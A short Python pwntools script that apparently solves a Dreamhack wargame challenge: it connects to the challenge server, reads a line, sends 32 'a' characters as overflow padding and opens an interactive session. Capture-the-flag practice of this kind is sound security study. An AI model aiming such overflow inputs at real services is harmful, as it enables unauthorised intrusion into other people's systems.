from pwn import *
context.update(log_level= 'debug')
p = remote('host1.dreamhack.games', 13428)
p.recvline()
p.sendline('a'*0x20)
p.interactive()
